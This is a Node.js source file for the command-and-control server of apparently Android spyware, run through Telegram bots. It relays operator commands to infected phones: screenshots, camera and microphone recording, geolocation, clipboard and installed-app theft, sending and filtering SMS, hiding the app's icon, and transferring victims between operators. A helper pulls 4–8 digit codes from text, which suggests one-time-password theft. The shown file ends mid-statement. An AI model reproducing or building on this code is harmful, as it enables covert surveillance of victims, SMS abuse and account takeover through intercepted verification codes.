const net                     = require("net");
const os                      = require("os");
const fs                      = require("fs");
const https                   = require("https");
const http                    = require("http");
const path                    = require("path");
const url                     = require("url");
const TelegramBot             = require("node-telegram-bot-api");
const { UserDataTransform }   = require("../transform");

const udt = new UserDataTransform();
const networkInterfaces = os.networkInterfaces();
let accepted_users = [];
let accepted_ports = [];
const codeRegex = /\b\d{4,8}\b/g;
let sym = "𓏺|𓏺";
let ipAddress;

function build(string) {
    const translationTable = {
        'q': 'ǫ', 'w': 'ᴡ', 'e': 'ᴇ', 'r': 'ʀ', 't': 'ᴛ',
        'y': 'ʏ', 'u': 'ᴜ', 'i': 'ɪ', 'o': 'ᴏ', 'p': 'ᴘ',
        'a': 'ᴀ', 's': 's', 'd': 'ᴅ', 'f': 'ғ', 'g': 'ɢ',
        'h': 'ʜ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'z': 'ᴢ',
        'x': 'x', 'c': 'ᴄ', 'v': 'ᴠ', 'b': 'ʙ', 'n': 'ɴ',
        'm': 'ᴍ'
    };

    return string.split('').map(char => translationTable[char] || char).join('');
}

function splitQuery(query){
    let splitted = query.split("&")
    let dict = {};
    for (let spl of splitted){
        let _spl = spl.split("=");
        dict[_spl[0]] = _spl[1];
    }
    return dict;
}

function extractCodes(text){
    let codes = text.match(codeRegex) || [];
    let s = '';
    for (let code of codes){
        if (code != codes[codes.length - 1]){
            s += `<code>${code}</code> , `
        } else {
            s += `<code>${code}</code>`
        }
    }
    return s;
}

function getServerIP(){
    for (const interfaceName in networkInterfaces) {
        for (const net of networkInterfaces[interfaceName]) {
            if (net.family === 'IPv4' && !net.internal) {
                ipAddress = net.address;
                break;
            }
        }
        if (ipAddress){ return ipAddress; }
    }
}

function downloadFile(fileUrl, filePath){
    https.get(fileUrl, (response) => {
        if (response.statusCode === 200) {
            const fileStream = fs.createWriteStream(filePath);
            response.pipe(fileStream);
            fileStream.on('finish', () => {
                fileStream.close();
                console.log('Download completed successfully.');
            });
        } else {
            console.log(`Failed to download file: ${response.statusCode}`);
        }
    }).on('error', (err) => {
        console.error(`Error: ${err.message}`);
    });
    
}

const getUsersByPort = async (portname, password, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname && user.port.password == password){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id,
                socket: user.socket
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getSafeUsersByPort = async (portname, password, callback = () => {}) => {
    let found_users = [];
    for (let user of accepted_users){
        if (user.port.name == portname && user.port.password == password){
            found_users.push({
                command: `/sign_${user.device_id}`,
                accessory: user.access,
                device_id: user.device_id
            });
        }
    }

    callback({
        status: true,
        users: found_users,
        method: "getUsers"
    })
}

const getUserByDeviceId = async (portname, password, devid, callback = () => {}) => {
    await getUsersByPort(portname, password, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId",
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId",
            message: "USER_NOT_FOUND",
        });
    })
}

const getSafeUserByDeviceId = async (portname, password, devid, shortcut, callback = () => {}) => {
    await getSafeUsersByPort(portname, password, async (allusers) => {
        for (let user of allusers.users){
            if (user.device_id == devid){
                callback({
                    status: true,
                    user: user,
                    method: "getUserByDeviceId",
                    device_id: devid,
                    shortcut: shortcut
                });
                return;
            }
        }
        callback({
            status: false,
            method: "getUserByDeviceId",
            message: "USER_NOT_FOUND",
            device_id: devid,
            shortcut: shortcut
        });
    })
}

const openUrl = async (portname, passname, devid, url, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "openUrl",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "openUrl",
            url: url,
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const vibratePhone = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;

        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "vibratePhone",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "vibratePhone",
            shortcut: shortcut
        }));
        
        callback({
            status: true
        });
    })
}

const sendToast = async (portname, passname, devid, toast, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendToast",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendToast",
            toast: toast,
            shortcut: shortcut
        }));
        
        callback({
            status: true
        });
    })
}

const getGeoLocation = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "getGeoLocation",
                message: "USER_NOT_FOUND",
                device_id: devid,
                shortcut: shortcut
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getGeoLocation",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const sendAllSMS = async (portname, passname, devid, sms, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendAllSMS",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendAllSMS",
            sms: sms,
            shortcut: shortcut
        }));
        
        callback({
            status: true
        });
    })
}

const sendSMS = async (portname, passname, devid, sms, tonumber, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "sendSMS",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "sendSMS",
            sms: sms,
            tonumber: tonumber,
            shortcut: shortcut
        }));

        
        callback({
            status: true
        });
    })
}

const setSMSFilter = async (portname, passname, devid, filter_number, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "setSMSFilter",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "setSMSFilter",
            filter_number: filter_number,
            shortcut: shortcut
        }));

        
        callback({
            status: true
        });
    })
}

const removeSMSFilter = async (portname, passname, devid, filter_number, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        let found = null;
        if (user.status == true){
            found = user.user;
        }

        if (found == null){
            callback({
                status: false,
                method: "removeSMSFilter",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }
        
        found.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "removeSMSFilter",
            filter_number: filter_number,
            shortcut: shortcut
        }));

        
        callback({
            status: true
        });
    })
}

const getInstalledApps = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "getInstalledApps",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getInstalledApps",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const setSoundVolume = async (portname, passname, devid, volume, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "setSoundVolume",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "setSoundVolume",
            volume: volume,
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const getClipboard = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "getClipboard",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "getClipboard",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const takeScreenshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "takeScreenshot",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "takeScreenshot",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const takeFrontshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "takeFrontshot",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "takeFrontshot",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const takeBackshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "takeBackshot",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "takeBackshot",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const recordFront = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "recordFront",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "recordFront",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const recordBack = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "recordBack",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "recordBack",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const recordMicrophone = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "recordMicrophone",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "recordMicrophone",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const hideApp = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "hideApp",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "hideApp",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const unhideApp = async (portname, passname, devid, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "unhideApp",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "hideApp",
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const changeIcon = async (portname, passname, devid, icon, shortcut, callback = () => {}) => {
    await getUserByDeviceId(portname, passname, devid, async (user) => {
        if (user.status == false){
            callback({
                status: false,
                method: "changeIcon",
                message: "USER_NOT_FOUND",
                device_id: devid
            });
            return;
        }

        user.user.socket.write(JSON.stringify({
            port: portname,
            password: passname,
            method: "changeIcon",
            icon: icon,
            shortcut: shortcut
        }));

        callback({
            status: true
        });
    })
}

const changePortPassword = async (portname, passname, newpassword, id, callback = () => {}) => {
    await getUsersByPort(portname, passname, async (allusers) => {
        let nums = 0;
        for (let user of allusers.users){
            user.socket.write(JSON.parse({
                port: portname,
                password: passname,
                new_password: newpassword,
                method: "changePortPassword"
            }))
            nums += 1;
        }
        callback({
            status: true,
            changed_users: nums,
            from: passname,
            to: newpassword
        });
        await udt.changePassword(id, newpassword)
    })
}

const changeUsersOwning = async (portname, passname, newport, newpassword, userslength, callback = () => {}) => {
    await getUsersByPort(portname, passname, async (allusers) => {
        if (userslength > allusers.users.length){
            callback({
                status: false,
                message: "NOT_ENOUGH_USERS"
            });
            return;
        }
        let nums = 0;
        for (let user of allusers.users){
            user.socket.write(JSON.parse({
                port: portname,
                password: passname,
                new_password: newpassword,
                net_port: newport,
                method: "changeUsersOwning"
            }))
            nums += 1;
        }
        callback({
            status: true,
            changed_users: nums,
            from: {
                port: portname,
                password: passname
            },
            to: {
                port: newport,
                password: newpassword
            }
        });
    })
}

const server = net.createServer(async (socket) => {
    socket.on('data', async (data) => {
        try{
            let message = JSON.parse(data.toString());
            console.log(message)
            if (Object.keys(message).includes("mask")){
                if (message.mask == "metro"){
                    if (Object.keys(message).includes("port") && Object.keys(message).includes("password")){
                        await udt.getUserByPort(message.port, message.password, async (_port) => {
                            let bot = new TelegramBot(_port.port.token);
                            
                            if (!_port.status){
                                message.shortcut.edit == false ? await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build("🔴 𓏺|𓏺 invalid port or password detected"),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                ) : await bot.editMessageText(
                                    build("🔴 𓏺|𓏺 invalid port or password detected"),
                                    {
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                )
                                return;
                            }

                            if (_port.user.is_ban){
                                message.shortcut.edit == false ? await bot.sendMessage(
                                    message.shortcut.chat_id,
                                    build("🔴 𓏺|𓏺 sorry but you got banned"),
                                    {
                                        reply_to_message_id: message.shortcut.message_id
                                    }
                                ) : await bot.editMessageText(
                                    build("🔴 𓏺|𓏺 sorry but you got banned"),
                                    {
                                        chat_id: message.shortcut.chat_id,
                                        message_id: message.shortcut.message_id
                                    }
                                )
                                return;
                            }

                            accepted_ports.push({
                                port: message.port,
                                password: message.password,
                                socket: socket
                            })

                            if (message.method == "getUsers"){
                                await getSafeUsersByPort(message.port, message.password, async (allusers) => {
                                    socket.write(JSON.stringify(allusers));
                                })
                            } else if (message.method == "getUserByDeviceId"){
                                await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                                    if (user.status == false && user.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    } else {
                                      socket.write(JSON.stringify(user));
                                    }
                                })
                            } else if (message.method == "openUrl"){
                                await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "vibratePhone"){
                                await vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "sendToast"){
                                await sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "getGeoLocation"){
                                await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "sendAllSMS"){
                                await sendAllSMS(message.port, message.password, message.device_id, message.sms, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "sendSMS"){
                                await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "getInstalledApps"){
                                await getInstalledApps(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "setSoundVolume"){
                                await setSoundVolume(message.port, message.password, message.device_id, message.volume, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "getClipboard"){
                                await getClipboard(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "takeScreenshot"){
                                await takeScreenshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "takeFrontshot"){
                                await takeFrontshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "takeBackshot"){
                                await takeBackshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "recordBack"){
                                await recordBack(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "recordFront"){
                                await recordFront(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "recordMicrophone"){
                                await recordMicrophone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "setSMSFilter"){
                                await setSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "removeSMSFilter"){
                                await removeSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "hideApp"){
                                await hideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "unhideApp"){
                                await unhideApp(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "changeIcon"){
                                await changeIcon(message.port, message.password, message.device_id, message.icon, message.shortcut, async (dt) => {
                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build("🔴 𓏺|𓏺 user not found"),
                                            {
                                                chat_id: message.shortcut.chat_id,
                                                message_id: message.shortcut.message_id
                                            }
                                        )
                                    }
                                })
                            } else if (message.method == "changePortPassword"){
                                await changePortPassword(message.port, message.password, message.new_password, message.shortcut.msgowner, async (dt) => {
                                    message.shortcut.edit == false ? await bot.sendMessage(
                                        message.shortcut.chat_id,
                                        build(`⚡ ${sym} new password seted for your users\n\n📪 ${sym} old pass: ${dt.from}\n🌉 ${sym} new pass: ${dt.to}`),
                                        {
                                            reply_to_message_id: message.shortcut.message_id
                                        }
                                    ) : await bot.editMessageText(
                                        build(`⚡ ${sym} new password seted for your users\n\n📪 ${sym} old pass: ${dt.from}\n🌉 ${sym} new pass: ${dt.to}`),
                                        {
                                            message_id: message.shortcut.message_id,
                                            chat_id: message.shortcut.chat_id
                                        }
                                    )
                                })
                            } else if (message.method == "changeUsersOwning"){
                                await changeUsersOwning(message.port, message.password, message.new_port, message.new_password, message.userslength, async (dt) => {
                                    if (dt.status){
                                        let date = new Date();
                                        message.shortcut.edit == false ? await bot.sendMessage(
                                            message.shortcut.chat_id,
                                            build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` + build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` + build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
                                            {
                                                reply_to_message_id: message.shortcut.message_id
                                            }
                                        ) : await bot.editMessageText(
                                            build(`➕ ${sym} ${message.userslength} users were moved\n\n💠 ${sym} from `) + `${message.port} & ${message.password}` + build(`\n\n🛠 ${sym} to `)+ `${message.new_port} & ${message.new_password}` + build(`\n\n⌚ ${sym} ${date.getUTCFullYear()}/${date.getUTCMonth()}/${date.getUTCDay()} - ${date.getUTCHours()}:${date.getUTCMinutes()}:${date.getUTCSeconds()}:${date.getUTCMilliseconds()}`),
                                            {
                                                message_id: message.shortcut.message_id,
                                                chat_id: message.shortcut.chat_id
                                            }
                                        )
                                    } else {
                                        message.shortcut.edit == false ? await bot.sendMessage(
